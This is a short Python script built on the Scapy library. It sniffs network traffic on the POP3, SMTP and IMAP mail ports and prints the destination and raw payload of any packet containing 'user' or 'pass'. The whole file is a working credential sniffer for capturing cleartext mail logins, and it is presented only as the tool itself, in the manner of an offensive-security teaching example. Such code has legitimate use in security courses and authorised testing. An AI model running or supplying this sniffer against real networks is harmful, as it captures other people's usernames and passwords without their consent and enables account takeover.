from scapy.all import sniff, TCP, IP

# Every packet that passes the filter will be passed to this function
def packet_callback(packet):
    # If packet has data payload check if user or pass in data, if so print out data.
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    # Start sniffer with Berkely packet filter for common mail ports
    # Port 110 - POP3, Port 143 - IMAP, Port 25 - SMTP 25
    # store=0 specifies not saving the packets in memory.
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
            prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
